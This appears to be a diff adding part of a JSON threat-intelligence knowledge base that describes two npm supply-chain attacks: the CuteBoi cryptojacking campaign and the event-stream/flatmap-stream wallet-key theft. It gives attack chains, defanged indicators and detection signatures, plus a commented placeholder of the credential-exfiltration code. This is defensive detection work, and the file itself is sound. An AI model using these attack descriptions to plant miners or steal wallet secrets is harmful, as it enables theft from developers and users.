+                    "filesystem",
+                    "network",
+                    "process_execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "various (over 1200) CuteBoi-related packages (names randomized, e.g., cloudyboi12, etc.)",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions (over 1200 packages, each with initial version)",
+                  "why_malicious": "These packages are direct clones of the eazyminer package, each embedding XMRig cryptocurrency mining binaries and configuration files that direct mined currency to attacker-controlled endpoints. The packages are distributed at scale via automated, disposable npm accounts, indicating a coordinated, large-scale cryptojacking campaign. The presence of mining binaries and attacker-controlled wallet configuration is not expected in legitimate npm packages, and the packages are designed to exploit unsuspecting users' compute resources for illicit profit."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker publishes over 1200 npm packages, each embedding a miner binary and attacker-controlled configuration file.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Packages are available for installation by unsuspecting users."
+                  },
+                  {
+                    "step": 2,
+                    "action": "User or automated system (e.g., CI/CD pipeline) installs and imports the malicious package.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code and binaries are present on the host system and ready for execution."
+                  },
+                  {
+                    "step": 3,
+                    "action": "When invoked, the package's JavaScript code launches the XMRig miner binary with the attacker-supplied configuration.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Host system begins mining Monero for the attacker's benefit, consuming CPU and network resources."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Mined cryptocurrency is sent to attacker-controlled wallet via attacker-controlled mining pool endpoint.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker profits from unauthorized use of victim's compute resources."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm packages that contain and execute XMRig or other cryptocurrency mining binaries at runtime",
+                    "Automatic execution of bundled binaries via child_process or similar APIs",
+                    "Presence of hardcoded mining pool URLs and wallet addresses in configuration files",
+                    "Mining activity initiated without user interaction or consent"
+                  ],
+                  "file_indicators": [
+                    "Presence of XMRig binaries (Windows/Linux) with randomized or misleading names in package directories",
+                    "config.json or similarly named files containing mining pool configuration with attacker-controlled endpoints",
+                    "Unusual binary files present in npm package root or subdirectories unrelated to stated package functionality"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to known mining pools or attacker-controlled endpoints (e.g., knowledgemd[.]com, scpulse[.]com, idots[.]cf, fisch[.]ml, Nordalts[.]ml, 130.162.52[.]80)",
+                    "Network traffic to domains or IPs not associated with legitimate mining pools, especially those hardcoded in package configuration"
+                  ],
+                  "how_to_detect": "Scan npm packages for embedded mining binaries such as XMRig, especially those with randomized or misleading names. Analyze configuration files for hardcoded mining pool URLs and wallet addresses that do not belong to the user. Monitor for unexpected process execution of mining binaries and outbound network connections to known mining pool domains or suspicious IP addresses. Flag packages that include binaries unrelated to their stated functionality or that match known cryptominer hashes. Correlate file, process, and network indicators to identify automated cryptojacking campaigns."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_457609_snippet_1",
+              "source_package": "event-stream (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20250105_195714_457609/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4969364106655121,
+              "code_similarity": 0.45743757486343384,
+              "behavior_similarity": 0.5364352464675903,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "module.exports = function (a, b) {\n  // Obfuscated code begins\n  var c = require('crypto');\n  var d = require('fs');\n  var e = require('http');\n  // ... (hundreds of lines of obfuscated code)\n  // The code searches for wallet private keys in memory and on disk\n  // If found, it encrypts and sends them to a remote server via HTTP POST\n  // Obfuscated domain and payload construction\n  // ...\n};",
+                "code_behavior": "At runtime, the code inspects the application's memory and filesystem for cryptocurrency wallet private keys, then exfiltrates any discovered secrets via HTTP POST to an attacker-controlled domain, resulting in credential theft.",
+                "malice_analysis": {
+                  "why_suspicious": "The code is heavily obfuscated, imports modules for filesystem and network access, and performs actions unrelated to a stream utility, such as searching for wallet secrets and sending them to an external server. The obfuscation and exfiltration logic are clear indicators of malicious intent.",
+                  "violated_expectations": "A legitimate stream utility library should only process data streams and should not access sensitive wallet files or perform network communication to unknown domains. The presence of credential harvesting and exfiltration is a direct violation of expected package behavior.",
+                  "similar_legitimate_use": "Legitimate wallet applications may access wallet files and perform network operations, but a generic stream utility or its dependencies should never do so. Such behavior is highly anomalous in this context.",
+                  "key_indicators": [
+                    "Heavily obfuscated JavaScript code in a utility dependency",
+                    "Unexpected use of 'fs', 'crypto', and 'http' modules in a stream utility",
+                    "Searches for wallet or credential files in memory and on disk",
+                    "Outbound HTTP POST requests to hardcoded, attacker-controlled domains",
+                    "Presence of flatmap-stream@0.1.1 as a dependency of event-stream"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when the dependent application processes streams using event-stream/flatmap-stream)",
+                  "file_location": "node_modules/flatmap-stream/index.js (as a dependency of event-stream)",
+                  "required_permissions": [
+                    "filesystem (read access to wallet/credential files)",
+                    "network (outbound HTTP/HTTPS requests)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "event-stream",
+                  "package_manager": "npm",
+                  "package_versions": "4.0.1 (specifically the version with the malicious dependency flatmap-stream 0.1.1)",
+                  "why_malicious": "The event-stream package was compromised when a malicious dependency, flatmap-stream@0.1.1, was added. This dependency contained heavily obfuscated JavaScript code designed to search for and extract cryptocurrency wallet secrets, specifically targeting applications like the CoPay wallet. The malicious code exfiltrated sensitive data to an attacker-controlled server, making event-stream@4.0.1 and any downstream application using it a vector for credential theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker gains control of the event-stream package and adds a malicious dependency (flatmap-stream@0.1.1) containing obfuscated credential-stealing code.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is included in downstream applications that depend on event-stream."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Downstream application (e.g., CoPay wallet) installs and includes the compromised event-stream package, bringing in the malicious flatmap-stream dependency.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is present and will execute in the context of the wallet application."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious code in flatmap-stream executes at runtime, searching for wallet secrets in memory and on disk, and exfiltrating them to an attacker-controlled server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives stolen wallet credentials, enabling theft of cryptocurrency assets."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Presence of heavily obfuscated JavaScript code in dependencies of popular npm packages",
+                    "Unexpected filesystem access to wallet or credential files by utility libraries",
+                    "Network requests (HTTP POST) to hardcoded or suspicious domains from within utility dependencies",
+                    "Use of 'fs', 'crypto', and 'http' modules in packages not expected to require them"
+                  ],
+                  "file_indicators": [
+                    "node_modules/flatmap-stream/index.js",
+                    "Presence of flatmap-stream@0.1.1 as a dependency of event-stream@4.0.1",
+                    "Obfuscated code blocks within flatmap-stream/index.js"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS POST requests to attacker-controlled domains (as identified in the obfuscated code) from within wallet or utility applications",
+                    "Unusual network activity originating from flatmap-stream or event-stream dependencies"
+                  ],
+                  "how_to_detect": "Perform static analysis on dependencies of popular npm packages to identify obfuscated or minified code, especially in utility libraries. Flag the presence of flatmap-stream@0.1.1 as a dependency of event-stream@4.0.1. Monitor runtime behaviors for unexpected filesystem access to wallet or credential files and outbound HTTP/HTTPS requests to unknown or suspicious domains. Correlate the use of 'fs', 'crypto', and 'http' modules in packages that should not require them. Alert on any code that searches for wallet secrets or performs credential exfiltration."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
